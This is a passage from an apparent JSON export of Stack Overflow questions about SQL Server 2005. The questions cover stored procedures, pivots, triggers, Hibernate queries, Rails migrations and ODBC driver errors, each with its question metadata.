of values based on condition in SQL Server 2005?","body":"<p>I am a beginner in SQL Server 2005 stored procedure. I can't seem to get it working as wanted. </p>\n\n<p>I have a sp that takes in parameter @caseid from a table called <code>annot</code>. <code>@caseid</code> is assigned to value of column <code>src_caseid</code> and can have multiple references (<code>ref_caseid</code>) or none in table <code>annot</code>. I want to set a condition and set proper shepardsflag depending on the column <code>court</code> from table <code>case</code> which I did using INNER JOIN.</p>\n\n<p>Basically this is the scenario:</p>\n\n<ul>\n<li>Table <code>annot</code> - <code>ref_caseid, src_caseid, annotation</code></li>\n<li>Table <code>case</code> - <code>caseid, court</code></li>\n</ul>\n\n<p>Example of set of results from the INNER JOIN on <code>ref_caseid = caseid</code> like this:</p>\n\n<pre><code>ref_caseid   src_caseid   annotation    court\n  17334         17338        Refd       high court\n  17600         17338        Foll       federal court\n  18271         17338        Foll       federal court\n  43220         17338        Not Foll   supreme court\n</code></pre>\n\n<p>Condition to be set:</p>\n\n<p>From the recordset, if <code>federal court</code> exists, it should only take rows of <code>federal court</code>. If NO <code>federal court</code> is found, then it will take other cases with other court values.</p>\n\n<p>To achieve this, I set a counter for <code>federal court</code> counts. But seems that SQL only reads the last row and set <code>@courtFC</code> value based on it. I've tried <code>order by</code> but doesn't seem working as well.</p>\n\n<p>From sample above, the final shepardsflag value of case 17338 should be = 3 (Foll) as it should take rows with \"federal court\" only AND ignore the rest of the rows.</p>\n\n<p>But the current result is shepardsflag = 2 ; which is wrong</p>\n\n<p>I hope I explain well.</p>\n\n<p>Can someone please help me on the right logic? Should I create a temp table? Thanks in advance.</p>\n\n<p><strong>Script:</strong></p>\n\n<pre><code>ALTER PROCEDURE [dbo].[spUpdateShepardsFlags] @caseid int = null AS\nbegin\ndeclare @Shep int\ndeclare @ref_caseid int\ndeclare @court int\ndeclare @courtFC int\ndeclare @annot int\n\nif @caseid is not null\n   begin\n      select @court = b.court, @ref_caseid = a.ref_caseid, @annot = a.annotation\n         from cba_annot a inner join cbm_case b on a.ref_caseid = b.caseid \n         where a.src_caseid = @caseid\n\n      if @court is not null\n        begin\n           if @court = 'MYFC'\n              set @courtFC = @courtFC + 1\n           if @court &lt;&gt; 'MYFC'\n              SET @courtFC = @courtFC + 0\n            PRINT 'The @courtFC counter : ' + CAST(@courtFC AS CHAR) \n        end\n\n        if @court is not NULL \n        begin\n          if @courtfc &gt; 0\n           begin \n             if exists(select a.ref_caseid, b.court, a.annotation, a.src_caseid from \n                       cba_annot a inner join cbm_case b on a.ref_caseid = b.caseid)\n                begin\n                   if exists(select src_caseid from cba_annot where (annotation like '%Refd%'\n                      or annotation like '%Comp%')\n                      and src_caseid = @caseid)\n                      set @Shep = 4\n\n                   if exists(select src_caseid from cba_annot where (annotation like '%Foll%'\n                      or annotation like '%Aff%')\n                      and src_caseid = @caseid)\n                      set @ShepFC = 3\n\n                    update cbm_case\n                    set shepardsflag = @shep\n                    where caseid=@caseid\n                end\n            end\n\n          else -- if @courtFC = 0\n            begin --new\n             if exists(select a.ref_caseid, b.court, a.annotation, a.src_caseid from \n                       cba_annot a inner join cbm_case b on a.ref_caseid = b.caseid)\n                begin\n                   if exists(select src_caseid from cba_annot where (annotation like '%Refd%'\n                      or annotation like '%Comp%')\n                      and src_caseid = @caseid)\n                      set @Shep = 4\n\n                   if exists(select src_caseid from cba_annot where (annotation like '%Foll%'\n                      or annotation like '%Aff%')\n                      and src_caseid = @caseid)\n                      set @Shep = 3\n\n                   if exists(select src_caseid from cba_annot where (annotation like '%Not Foll%'\n                      or annotation like '%Dist%')\n                      and src_caseid = @caseid)\n                      set @Shep = 2\n\n                    update cbm_case\n                    set shepardsflag = @shep\n                    where caseid=@caseid\n                end\n\n          end -- new\n      end\n  else  --- if court is NULL -- case not referred by any other case\n        update cbm_case\n        set shepardsflag = 5\n        where caseid=@caseid\n  end \n\nelse -- if caseid is null\n\n-- other condition\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","sum"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":166,"score":3,"question_id":11619252,"title":"Cumulative sum & percentage","body":"<p>I have a table called Sales:</p>\n\n<pre><code>id_sale  id_ticket  total  state\n-------  ---------  -----  -----\n100      100        30     inactive    \n101      101        30     active    \n102      101        60     active    \n103      102        30     active    \n104      102        30     active    \n105      103        10     active    \n106      103        5      active    \n</code></pre>\n\n<p>What I need is to get the total sum of the <code>total</code> column, sum(total) when the state is active and multiply it for x percentage (I can do that), having that I have to select all the tickets that their sum (of all the tickets summed) is <code>&lt;= sum(total) * x percentage</code> and copy it to another table (same values)</p>\n\n<p>So if I have the sum of ticket 101 = 90 and the sum of ticket 102 = 60 and the sum of ticket 103 = 15, and the sum(total)*x percentage = 160, the query will only return all the info from the tickets 101 and 102.</p>\n\n<p>Reading all morning I found a code that somehow does something like what I need but using id_Sales and not id_ticket:</p>\n\n<pre><code>    select t1.id_sale, t1.total, SUM(t2.total) as sum\n    from sales t1\n    inner join sales t2 on t1.id_sale &gt;= t2.id_sale\n    where t2.state='active'\n    group by t1.id_sale, t1.total\n    having sum(t2.total)&lt;=(\n                           select sum(total)*.65\n                           from sales\n                           where state='active')\n    order by t1.id_sale\n</code></pre>\n\n<p>What i espect to recieve is:</p>\n\n<pre><code>id_sale  id_ticket  total  state\n-------  ---------  -----  ----- \n101      101        30     active    \n102      101        60     active    \n103      102        30     active    \n104      102        30     active\n</code></pre>\n\n<p>In wich the sum of ticket 101 and ticket 102 is &lt;= sum(total)*x</p>\n\n<p>so the sum of 101 and 102 = 150 and sum(total)*x = 160 (for example)</p>\n\n<p>How can I do what I need or how can I edit this code so it does what I'm looking for.</p>\n"},{"tags":["performance","sql-server-2005","udf"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":11615703,"title":"Scalar-Valued Function Slower than Expected","body":"<pre><code>CREATE function [dbo].[fn_GetDateOnly](@dateWithTime datetime)\n    returns datetime WITH SCHEMABINDING\nas\nbegin\n    return DATEADD(DAY, DATEDIFF(DAY, 0, @dateWithTime), 0)\nend\n\n\nSELECT stuff, count(ff.id)\nFROM dbo.foo AS ff \nwhere\n--DATEADD(DAY, DATEDIFF(DAY, 0, ff.startDate), 0) &lt;= @curdate --6700ms\n--dbo.fn_GetDateOnly(ff.startDate) &lt;= @curdate --9300ms\ngroup by stuff\norder by stuff desc\n</code></pre>\n\n<p>Why is calling fn_getdateonly so much slower than inlining it? Doesn't SQL inline the function call?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","index"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":11608300,"title":"How to index two columns automatically in sql","body":"<p>I have a table in sql having two fields 'JOB_NUMBER' 'SRno', the relation between the two is such that  each job number has many SRNO starting from 1,2,3 and so on,every new Job number has to have a SR no starting form 1,</p>\n\n<p>so my ideal table should some what look like this:</p>\n\n<pre><code>JOB_NUMBER    SRno\n   1            1\n   1            2 \n   1            3\n   2            1\n   2            2\n   3            1 and so on.......\n</code></pre>\n\n<p>What I want to do is to achive this indexing in sql itself ,can I do this ,is so how?</p>\n"},{"tags":["asp.net","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":11613605,"title":"\"database x is beign recovered\" inside an ASP.NET application","body":"<p>I am pulling a report in ASP.NET 3.5 and SQL Server 2005. After running the report sometimes (not all the times), I get this message that database XXX is being recovered, please wait ...</p>\n\n<p>My question is I do not even use that database in my application. My report is pulling data from another database. What does this message really mean? Do I need to worry about it.</p>\n\n<p>I got it on development environment a couple of times before but now I got it on production environment as well.</p>\n"},{"tags":["sql","winforms","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":205,"score":0,"question_id":11611881,"title":"Use an MS SQL Server function as a column alias","body":"<p>I've created a function for retrieving the translations of database columns in MS SQL Server 2005, depending on the selected language code (e.g. 'el-GR'). The function itself works correctly, but I am unable to use its result as the Alias for the retrieved columns.</p>\n\n<p>This is the code I'm using:</p>\n\n<pre><code>SELECT\n    tblAuditors.[Full Name] as dbo.GetLocalizedGridTranslation('Auditor Name', @languageCode)\nFROM tblCompanyAuditors\n</code></pre>\n\n<p>Does anyone know how I can trick the SQL Server into allowing me to use the function as an Alias name?</p>\n"},{"tags":["java","sql-server-2005","mssql-jdbc"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":94,"score":1,"question_id":11611221,"title":"MSSQL JDBC on unix","body":"<p>I am trying to integrate a web tool we have with a sql server database using Integrated Security. I have been looking around trying to find a unix version of the sqljdbc4.jar however I cannot seem to find one with .so files only .dll's. </p>\n\n<p>Does anyone know where I can get a version with the .so files required or another way to use integrated security?</p>\n\n<p>Currently my application is failing to connect with</p>\n\n<pre><code>com.microsoft.sqlserver.jdbc.SQLServerException: This driver is not configured for integrated authentication \n</code></pre>\n\n<p>and I can see </p>\n\n<pre><code>WARNING: Failed to load the sqljdbc_auth.dll \n</code></pre>\n\n<p>earlier in the logs.</p>\n\n<p>Using version 2.5 of mssqljdbc.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":11602519,"title":"Why does this trigger result in \"Invalid Column Name 'CreatedDT' \"?","body":"<p>The following SQL creates a trigger without error. When I add a record in SSMS, the trigger fails and displays the following message:</p>\n\n<blockquote>\n  <p>Msg 207, Level 16, State 1, Line 4<br>\n  Invalid column name 'CreatedDT'.</p>\n</blockquote>\n\n<p>What am I doing wrong ? This is SQL Server 2005 (v9.0.3080). Thanks!</p>\n\n<pre><code>CREATE TRIGGER TRG_XXX_CreatedOn ON dbo.XXX\nAFTER INSERT\nAS\nBEGIN\nUPDATE dbo.XXX\nSET dbo.XXX.CreatedDT = GETDATE()\nWHERE dbo.XXX.Id IN (SELECT Id FROM Inserted)\nEND\nGO\n</code></pre>\n"},{"tags":["hibernate","sql-server-2005","jpa-2.0"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":264,"score":0,"question_id":11593823,"title":"JPQL SELECT Distinct Query with Lob Column works fine on MySQL, but SQLServer 2005 doesn't","body":"<p>I'm Using Hibernate 3.6.10 based JPA2.0 , I created two objects which are Many-to-Many relation.</p>\n\n<pre><code>@Entity\n@Table(name=\"Project\")\npublic class Project implements Serializable {\n    @Id\n    @GeneratedValue(strategy = GenerationType.AUTO)\n    private Integer id;\n\n    private String topic;\n    @Lob\n    @Basic(fetch=FetchType.LAZY)\n    private String content;\n    @ManyToMany(fetch=FetchType.EAGER)\n    @JoinTable(name=\"TrProj_Area\",joinColumns=@JoinColumn(name=\"TrProj_ID\"), inverseJoinColumns=@JoinColumn(name=\"Area_ID\"))\n    private Set&lt;Area&gt; areas = new HashSet&lt;Area&gt;();\n    //getters and setters\n}\n\n@Entity\n@Table(name=\"Area\")\npublic class Area implements Serializable{\n     @Id\n     @GeneratedValue(strategy = GenerationType.AUTO)\n     private Integer id;\n     private String name;\n     @ManyToMany(mappedBy=\"areas\")\n     private Set&lt;Project&gt; projects;\n     //getters and setters\n}\n</code></pre>\n\n<p>The <strong>Project</strong> entity has a <strong>content</strong> property,It is <strong>Lob</strong> and <strong>Lazy Fetch</strong>, When I created a Query like this:</p>\n\n<pre><code>select distinct o from Project o join o.areas a where a.id in(?,?)\n</code></pre>\n\n<p><strong>It works fine on MySQL 5.5,but SQLServer 2005 doesn't</strong>.SQLServer error log is below:</p>\n\n<pre><code>Error code 306, SQL state S0001: The text, ntext, and image data types cannot be compared or sorted, except when using IS NULL or LIKE operator\n</code></pre>\n\n<p>I known this issue is caused by the <strong>content</strong> property,it seems that the <strong>lazy fetch</strong> config doesn't work , the text column can not include in the <strong>select distinct</strong> statement, but I can't remove it from my Entity, how can I solve this issue?</p>\n\n<hr>\n\n<p>Added at 20120722</p>\n\n<p>I have trace the MySQL(mysql-connector-java-5.1.10-bin.jar as driver) generated SQL in hibernate, is below:</p>\n\n<pre><code>Hibernate: \nselect\n    distinct proj0_.id as id1_,\n    proj0_.content as content1_,\n    proj0_.topic as topic1_,\n  from\n    Project proj0_ \ninner join\n    Proj_Area areas1_ \n        on proj0_.id=areas1_.Proj_ID \ninner join\n    Area area2_ \n        on areas1_.Area_ID=area2_.id \nwhere\n    area2_.id in (\n            ? , ?\n        )\norder by\n    proj0_.id desc limit ?\n</code></pre>\n\n<p>and this is generated by SQLServer2005(sqljdbc4.jar as driver),I'm concerning the error is caused by the <strong>group by</strong> statement</p>\n\n<pre><code>Hibernate: \n    WITH query AS (select\n        ROW_NUMBER() OVER (\n    order by\n       proj0_.id desc) as __hibernate_row_nr__,\n       proj0_.id as id1_,\n       proj0_.content as content1_,\n       proj0_.topic as topic1_,\n    from\n       project proj0_ \n    inner join\n       proj_area areas1_ \n           on proj0_.id=areas1_.proj_id \n    inner join\n       area area2_ \n           on areas1_.area_id=area2_.id \n    where\n       area2_.id in (? , ?)) \n    group by\n        proj0_.id,\n        proj0_.content,\n        proj0_.topic) SELECT\n        * \n    FROM\n        query \n    WHERE\n        __hibernate_row_nr__ BETWEEN ? AND ?\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","cursor","common-table-expression"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":401,"score":0,"question_id":4397247,"title":"Example of CTE to prove it is better than Cursor","body":"<p>I have read that CTE are better than cursor. But I am unable to find the simple clear example which can prove this. I am newbie in Sql Server 2005 and to understand it I need a simple example in which we are storing value via CTE and processing it one by one.</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":254,"score":0,"question_id":11592513,"title":"Warnings and Errors while installing Sql Server 2005 on 64 bit windows 7 machine","body":"<p>I am trying to install <strong>Sql Server 2005</strong>.</p>\n\n<p>Below are my machine configuration</p>\n\n<ul>\n<li>Windows 7 Home Basic - Operating System</li>\n<li>4.00 GB - Ram </li>\n<li>64 bit Operating System</li>\n</ul>\n\n<p>I have installed Visual Studio 2010 successfully on it, but when I try  to install my Sql Server 2005, I get some warnings and errors as shown below while installation..</p>\n\n<p>Firstly on double clicking the setup file, I get this message</p>\n\n<p><img src=\"http://i.stack.imgur.com/mFk4i.png\" alt=\"enter image description here\"></p>\n\n<p>I selected the Run Program option and continued with the setup...</p>\n\n<p>and then later on I get this error</p>\n\n<p><img src=\"http://i.stack.imgur.com/ii99G.png\" alt=\"enter image description here\"></p>\n\n<p>Below are detailed log for this warning/errors</p>\n\n<p><strong>- IIS Feature Requirement (Warning)</strong>\nMessages\nIIS Feature Requirement</p>\n\n<p>Microsoft Internet Information Services (IIS) is either not installed or is disabled. IIS is required by some SQL Server features.  Without IIS, some SQL Server features will not be available for installation. To install all SQL Server features, install IIS from Add or Remove Programs in Control Panel or enable the IIS service through the Control Panel if it is already installed, and then run SQL Server Setup again. For a list of features that depend on IIS, see Features Supported by Editions of SQL Server in Books Online</p>\n\n<p><strong>- ASP.Net Version Registration Requirement (Warning)</strong>\nMessages\nASP.Net Version Registration Requirement</p>\n\n<p>64-bit ASP.Net is Registered. Required 32-bit ASP.Net to install Microsoft Reporting Services 2005(32-bit).</p>\n\n<p>Please can anyone help me understand, how to get rid of these errors and help me install Sql Server 2005 on my machine</p>\n"},{"tags":["sql","sql-server-2005","sqlxml"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":11580885,"title":"Get a list of fields out of an XML data type","body":"<p>Given a table structure like such:</p>\n\n<pre><code>DECLARE @Employees TABLE(EmployeeID INT ,EmployeeDetails XML)\n\nINSERT INTO @Employees( EmployeeID ,EmployeeDetails )\nVALUES ( 1 ,'&lt;Employee&gt;&lt;EmployeeDetails&gt;&lt;EmployeeName&gt; Priyanka &lt;/EmployeeName&gt;&lt;Age&gt; 24 &lt;/Age&gt;&lt;Address&gt; Argentina&lt;/Address&gt;&lt;/EmployeeDetails&gt;&lt;/Employee&gt;')\n\nINSERT INTO @Employees\n( EmployeeID ,EmployeeDetails )\nVALUES ( 2 ,'&lt;Employee&gt;&lt;EmployeeDetails&gt;&lt;EmployeeName&gt; Sarkar &lt;/EmployeeName&gt;&lt;Age&gt; 28 &lt;/Age&gt;&lt;Address&gt; Australia&lt;/Address&gt;&lt;/EmployeeDetails&gt;&lt;/Employee&gt;')\n</code></pre>\n\n<p>How can I create a query to get a list of all tag NAMES (not values) underneath the EmployeeDetails tag? (Assuming the structure is the same for all records).</p>\n\n<p>So, desired result would be:</p>\n\n<pre><code>EmployeeName\nAge\nAddress\n</code></pre>\n\n<p>Sam</p>\n"},{"tags":["ruby-on-rails","ruby-on-rails-3","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":11552133,"title":"Getting ODBC 3700 error when ruby on rails is trying to add_index to new table","body":"<p>I am using the gem <code>activerecord-sqlserver-adapter</code> to connect to an existing Microsoft SQL Server using Ruby on Rails. I modified the <code>config\\application.rb</code> file to set my <code>table_name_prefix</code> as the following</p>\n\n<pre><code>config.active_record.table_name_prefix = 'msr.FSCR_'\n</code></pre>\n\n<p>So that all of my tables created with Ruby on Rails are in the <code>msr</code> schema and are grouped together with the <code>FSCR_</code> prefix. I have a table / scaffold that was created using the following</p>\n\n<pre><code>rails generate scaffold Customer name:string status:string \nrake db:migrate\n</code></pre>\n\n<p>which created the table <code>msr.FSCR_customers</code> which is correct. Then I created a model for sites as follows</p>\n\n<pre><code>rails generate scaffold Site name:string addr1:string addr2:string city:string\n    state:string zip:string \n</code></pre>\n\n<p>and the model/scaffold was generated correctly. The generate command created the database migration file <code>20120718221629_create_sites.rb</code> as follows</p>\n\n<pre><code>class CreateSites &lt; ActiveRecord::Migration\n  def change\n    create_table :sites do |t|\n      t.string :name\n      t.string :addr1\n      t.string :addr2\n      t.string :addr3\n      t.string :city\n      t.string :state\n      t.string :zip\n      t.string :phone\n      t.string :fax\n      t.integer :created_by\n      t.references :customer\n\n      t.timestamps\n    end\n    add_index :sites, :customer_id\n  end\nend\n</code></pre>\n\n<p>However when I run the <code>rake db:migrate</code> commend I get the following error message:</p>\n\n<pre><code>ODBC::Error: 37000 (102) [Microsoft][ODBC SQL Server Driver][SQL Server]Incorrect\nsyntax near '.'.: CREATE INDEX [index_msr].[FSCR_sites_on_customer_id] ON [msr].\n[FSCR_sites] ([customer_id])\n</code></pre>\n\n<p>If I comment out the line <code>add_index :sites, :customer_id</code> It creates the table just fine. When the table is created, I see that my foreign key is not there. How do I change / fix this issue?</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>I think I found the problem but I don't know how to change it. Because I'm using a table prefix of <code>msr.FSCR_</code> it is trying to create the index name with the prefix of <code>index_</code> + <code>msr.FSCR_</code> + {index_name} so the insert is trying to create </p>\n\n<pre><code>[index_msr].[sites_on_customer_id]\n</code></pre>\n\n<p>There is no schema of <code>index_msr</code> so I would expect this to fail. What I really want is the index name to be is</p>\n\n<pre><code>[index_msr_sites_on_customer_id]\n</code></pre>\n\n<p>Is there a way to remove the <code>].[</code> from the create index section of the <code>ActiveRecord</code> class?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":150,"score":2,"question_id":11570099,"title":"Dynamic pivot with nulls using count() and CTE when columns are unknown","body":"<p>I am soo close!\nI have a survey and the client wants to be able to see reports using various weights for the answers. SQLFiddle only allows 2008 and up but in 2005 I am getting these results:</p>\n\n<pre><code>Lesson wt count -&gt; | w1_5 | w2 | w3 | w5_5 | w6_5 | N\n-----------------------------------------------------\nq2                 | 1.5  | 2  | 3  | 5.5  | 6.5  | 9\n</code></pre>\n\n<p>Obviously they should be counts and not weights. </p>\n\n<p>Furthermore the only record being returned happens to be a row that has 0 nulls.</p>\n\n<p>I have made an <a href=\"http://sqlfiddle.com/#!3/9d106/15/0\" rel=\"nofollow\">SQLFiddle</a> with a non-dynamic example of my expected outcome at the bottom.</p>\n\n<p>I am not sure what the difference is that is making my dynamic query not sum and the non-dynamic one does.</p>\n\n<p>Here is my previous work (<a href=\"http://stackoverflow.com/questions/11404062/sql-server-advanced-report-of-multiple-rows-into-one\">1</a>,<a href=\"http://stackoverflow.com/questions/11459355/sql-server-2005-fill-pivot-table-with-0s\">2</a>,<a href=\"http://stackoverflow.com/questions/11465666/sql-server-2005-percentage-in-parenthesis-in-pivot-table\">3</a>)</p>\n\n<p><strong>---UPDATE---FINAL SOLUTION---</strong> </p>\n\n<p>Posted <a href=\"http://sqlfiddle.com/#!3/9d106/35/0\" rel=\"nofollow\">here</a>\nFor those who are interested.</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":11583867,"title":"Total Allowed Variables","body":"<p>Using SQL Server 2005 and have a stored procedure (not written by me) that I now have to maintain. Its an important query and I want to make some changes to make it easier to maintain without totally rewritting the whole thing. Just exploring some options, so...</p>\n\n<p>How many variables can I have in a stored procedure (is there a limit)? </p>\n\n<pre><code>DECLARE @MyVariable int\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","ssis"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":535,"score":2,"question_id":4224092,"title":"I want to start with SQL Server SSIS... kindly guide how to start over it","body":"<p>I want to start with SQL Server SSIS... kindly guide how to start over it and what are the areas that need to be looked in first.</p>\n\n<p>thanks in advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2346,"score":1,"question_id":10432086,"title":"Removes all white spaces of a string in SQL Server","body":"<p>What is the best way to remove all white spaces of a string in SQL Server 2008.\nLTRIM(RTRIM('  a b ') Would remove all white spaces at the right and left of the string. But I need to remove the space at middle also.</p>\n\n<p>Thanks in Advance</p>\n"},{"tags":["sql","sql-server-2005","insert","multiple-columns"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":11580379,"title":"Selecting multiple columns in SQL","body":"<p>I have a table with over a hundred columns, but I only want to select the the columns named nvarchar1, nvarchar2, ... nvarchar64. All of these 64 columns are next to each other so I was thinking maybe there is a way to select using column indices, but I couldn't find a solution.</p>\n\n<p>Note: I don't want to do the obvious solution,</p>\n\n<pre><code>SELECT nvarchar1,\n       nvarchar2,\n       ...\n       nvarchar64\n...\n</code></pre>\n"},{"tags":["android","database","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":166,"score":1,"question_id":11575529,"title":"Connect to an online SQL database in Android","body":"<p>I am developing my android app which interacts with an external MSSQL database (SQL server 2005). But dont have any clue on how to make that possible...so I referred some articles like..</p>\n\n<p><a href=\"http://stackoverflow.com/questions/9493822/android-java-connect-to-online-database\">Android Java connect to online database</a></p>\n\n<p><a href=\"https://groups.google.com/forum/?fromgroups#!topic/android-developers/9KCkhHP2_RY\" rel=\"nofollow\">https://groups.google.com/forum/?fromgroups#!topic/android-developers/9KCkhHP2_RY</a></p>\n\n<p><a href=\"https://groups.google.com/forum/?fromgroups#!topic/phonegap/YCRt2HducKg\" rel=\"nofollow\">https://groups.google.com/forum/?fromgroups#!topic/phonegap/YCRt2HducKg</a></p>\n\n<p>but couldn't get it through. can anyone plz explain me how can i make it possible with some basic tutorials or code.</p>\n\n<p>Thanks in advance :)</p>\n"},{"tags":["asp.net","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":11575122,"title":"web app throwing strange sql errors","body":"<p>apologies if this is not a good place to post this, but we are experiencing some very strange things with our web ap which is running on a SQL 2005 instance.</p>\n\n<p>the application is a .net web app and does as you would expect a number of queries throughout the day.</p>\n\n<p>but intermittently we are getting errors such as Exception message: *DataBinding: 'System.Data.DataRowView' does not contain a property with the name 'column_name'*. when it clearly does have that column in the query - which if run by hand works fine.. is this a symptom of the SQL instance maybe running out of memory or just being generally poorly?</p>\n\n<p>certainly we cannot track any problems in the code!</p>\n\n<p>unfortunately both the web app and SQL instance are on the same box which is a Xeon with 4GB of ram, so by no means uber powerful..</p>\n\n<p>ps. its not just queries like the above that seem to fall over, but some linq-to-sql things to, in fact it goes through phases of not liking the DB at all.. any help/suggestions would be happily received</p>\n\n<p>thanks</p>\n\n<p>nat</p>\n\n<p>some code.. cant see anything wrong with the below.. but the exception above is basically saying cant find column a or b or c...</p>\n\n<pre><code>Dim conn As New SqlConnection(sitedb)\n    Dim cmd As New SqlCommand\n    cmd.CommandText = \"SELECT a,b,c FROM Table\"\n    Dim da As New SqlDataAdapter(cmd)\n    Dim dt As New DataTable\n\n    Try\n        conn.Open()\n\n        da.Fill(dt)\n\n    Catch ex As Exception\n        Throw ex\n    Finally\n        conn.Close()\n    End Try\n\n    if dt.Rows.Count &gt; 0 then\n       Grid.DataSource = dt **&lt;- dies here....**\n       Grid.DataBind()\n    end if\n</code></pre>\n\n<p><strong>how can it return rows from a query that clearly works and then throw an indexoutofrange on a column its just grabbed?</strong>\nthe real issue I think is that none of the problems we are experiencing are code related.. the db seems to go through a times of throwing wobblies and we experience a number of strange exceptions that dont seem to make sense. could this be resource related, as in if the box is underpowered, or ..?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":11573362,"title":"extract data from filename using sql server","body":"<p>I want to extract data from filename where filename is \"20120522175832546.PBF\".In this i need \"PBF\" from filename using sql query.(Platform Sql server 2005)</p>\n"},{"tags":["tsql","sql-server-2005","null","pivot"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":173,"score":3,"question_id":11459355,"title":"SQL Server 2005 fill pivot table with 0s","body":"<p>I have <a href=\"http://sqlfiddle.com/#!3/a1627/3\" rel=\"nofollow\">this query</a> in SQL Server 2005 (I used the more convenient 2008 insert method for example only) and I need the (null) to be replaced with 0 in the grid output. </p>\n\n<p>Anyway to do this?</p>\n"},{"tags":["sql","tsql","sql-server-2005","null","pivot"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":114,"score":2,"question_id":11465666,"title":"SQL Server 2005 percentage in parenthesis in pivot table","body":"<p>This is a follow up question from <a href=\"http://stackoverflow.com/questions/11459355/sql-server-2005-fill-pivot-table-with-0s\">here</a>.\nI have some output and was able to add a total column but now I need to use the column to add percentage like this:</p>\n\n<pre><code>| LESSONID     RESPONSE COUNT-&gt; | 0       | 1       | 2       | 3       | 4       | N |\n---------------------------------------------------------------------------------------                         \n|lesson1                        | 1 (20%) | 1 (20%) | 1 (20%) | 1 (20%) | 1 (20%) | 5 |\n|lesson2                        | 1 (20%) | 1 (20%) | 1 (20%) | 2 (40%) | 0       | 5 |\n|lesson3                        | 1 (20%) | 1 (20%) | 0       | 3 (60%) | 0       | 5 |\n|lesson4                        | 0       | 1 (20%) | 4 (80%) | 0       | 0       | 5 |\n|lesson5                        | 0       | 5 (100%)| 0       | 0       | 0       | 5 |\n</code></pre>\n\n<p>I have found some help here but can't get it all to come together.</p>\n\n<p><a href=\"http://sqlfiddle.com/#!3/a1627/49/0\" rel=\"nofollow\">Here is what I have so far</a></p>\n\n<p>*Also I am on SQL Server 2005 which is not represented in SQLFiddle</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":78,"score":0,"question_id":11404062,"title":"SQL Server: advanced report of multiple rows into one","body":"<p>I have code that puts together data from many tables regarding a users response to all questions of a specific lesson. Responses look like this:</p>\n\n<pre><code>userid|lesson|question |response|label|weight|duration_seconds\n========================================================================\nbob   |first |loc_nameA|4       |R9   |3.5   |189\nbob   |first |loc_nameB|2       |R7   |4.5   |113\n\n</code></pre>\n\n<p>A report needs to be made showing all responses shown in one row. So for each question I need to display the response into a column along with its corresponding label,weight and duration like this:</p>\n\n<pre><code>userid|lesson|1_resp|1_labl|1_weig|1_dura|2_resp|3_labl|3_weig|3_dura|4_resp\n========================================================================\nbob   |first |4     |R9    |3.5   |189   |2     |R7    |4.5   |113   |1\n</code></pre>\n\n<p>OR alternatively by using the \"question\" column value as part of the dynamic column\nname. Currently they all have logical names like L1Q1 so just 1,2,3 will suffice as column names, but this might not always be the case:</p>\n\n<pre><code>userid|lesson|loc_nameA_resp|loc_nameA_labl|loc_nameA_weig|loc_nameA_dura|loc_nameB_resp|loc_nameB_labl|loc_nameB_weig|loc_nameB_dura|loc_nameC_resp\n================================================================================================================================================\nbob   |first |4             |R9            |3.5           |189           |2             |R7            |4.5           |113           |1\n</code></pre>\n\n<p>I have been reading about pivot tables but all examples seem more limited than what I am describing. How can this be done with SQL Server 2005? Should I be using something else? Is there an easier way?</p>\n"},{"tags":["vb.net","sql-server-2005","odbc","driver","windows-7-x64"],"answer_count":2,"favorite_count":4,"up_vote_count":13,"down_vote_count":0,"view_count":9574,"score":13,"question_id":1947634,"title":"64 bit ODBC Exception","body":"<p>I am getting the following ODBC exception when I moved my development platform from Windows XP X86 to Windows 7 X64:</p>\n\n<pre><code>ERROR [IM014] [Microsoft][ODBC Driver Manager] The specified DSN contains an architecture mismatch between the Driver and Application\n</code></pre>\n\n<p>What I'm sure it means is that the server it is connecting to is 32 bit, and the computer I'm running on is 64 bit and the ODBC driver in use is 64 bit.</p>\n\n<p>The application I am writing is set to run in 32 bit mode because some of the third-party 